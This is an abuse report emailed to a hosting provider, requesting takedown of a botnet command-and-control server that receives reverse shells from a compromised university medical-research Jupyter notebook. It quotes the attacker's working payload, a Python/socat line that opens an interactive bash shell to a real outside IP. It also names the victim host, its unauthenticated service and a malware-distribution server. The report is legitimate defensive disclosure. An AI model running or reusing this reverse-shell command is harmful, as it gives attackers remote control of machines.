---
to: abuse@akamai.com
cc: abuse@linode.com, abuse@nuclide-research.com
severity: CRITICAL
ip: 172.233.96.208
institution: Akamai/Linode US, confirmed botnet C2 server (Hilix-class) currently receiving reverse shell from compromised medical research device
status: DRAFT
outcome: sent
date: 2026-05-06
---

**To:** abuse@akamai.com
**Cc:** abuse@linode.com, abuse@nuclide-research.com
**Subject:** URGENT TAKEDOWN, botnet C2 server on Linode customer 172.233.96.208 actively receiving reverse-shell connections from compromised victims

---

Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com

2026-05-06

**URGENT C2 TAKEDOWN REQUEST**, Linode customer host serving as botnet command-and-control

**IP:** `172.233.96.208` (rDNS `172-233-96-208.ip.linodeusercontent.com`)
**Severity:** CRITICAL, active C2 receiving reverse shells from at least one confirmed compromised victim

---

I'm an independent security researcher conducting good-faith AI infrastructure research under the NuClide Research umbrella (CISA disclosures CVE-2025-4364, ICSA-25-140-11). This is an unsolicited C2-takedown request.

The host `172.233.96.208` is the active command-and-control endpoint for a Hilix-class botnet operation. Specifically, port 3053 is currently receiving a reverse-shell connection from a compromised medical research device at Universität Ulm Medical Faculty (`labdevice.medizin.uni-ulm.de`, IP `134.60.110.66`).

## Evidence

The compromised victim has an unauthenticated Jupyter Notebook (Jupyter 6.5.7 on port 8888) with a Python kernel actively running the following payload from a notebook file `TPC3.ipynb` (created 2026-05-05 17:14:38 UTC):

```python
import subprocess
subprocess.Popen('/usr/bin/socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:172.233.96.208:3053', shell=True)
```

The kernel's `last_activity` timestamp (2026-05-06 17:07:36 UTC, from `GET /api/kernels` on the victim host) confirms the socat process is still running.

The C2 host runs an nginx default page on port 80 (`Welcome to nginx!`) as decoy traffic. Port 3053 is the actual receiver and is filtered against external scanners (consistent with botnet operational security).

The victim's notebook history (`Untitled.ipynb`, 13 cells, modified 2026-04-29) shows the same attacker first attempted to install **Hilix.x86_64** from `38.87.117.84` (separate malware-distribution server). That attempt failed because the victim is an ARM-based embedded medical instrument (`Cocoa Labs CL1-2544-043` neural amplifier). The attacker returned 6 days later with the socat-based reverse shell, operationally adapted to the actual target architecture.

This is consistent with **Mirai-derivative IoT botnet** TTPs: scan for unauthenticated services (Jupyter Notebook in this case rather than Mirai's classic Telnet/SSH dictionary attack), drop platform-appropriate payload, beacon to C2.

## Action requested

**Terminate the customer / null-route 172.233.96.208**, at minimum the listener on port 3053. The host is receiving live reverse-shell connections from at least one confirmed-compromised victim; there are likely additional victims connecting to the same C2.

A parallel disclosure has been sent to `it-sicherheit@uni-ulm.de` and DFN-CERT (German NREN CERT) for the victim-side remediation.

A separate disclosure is being sent to `abuse@cogentco.com` for the malware-distribution server `38.87.117.84` (`velonodes.in`, currently appears offline from external scan).

## Reference

Full case study with attack timeline, victim file content, and forensic detail:
AI-LLM-Infrastructure-OSINT/blob/main/case-studies/commercial/multi-uni-ulm-jupyter-compromise-2026-05-06.md

NuClide Research disclosure context (CISA-listed researcher):
AI-LLM-Infrastructure-OSINT

Happy to provide additional forensic evidence (full notebook JSON, kernel session metadata, attack-timeline reconstruction) if needed for the customer-action investigation.

Regards,
Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com
AI-LLM-Infrastructure-OSINT
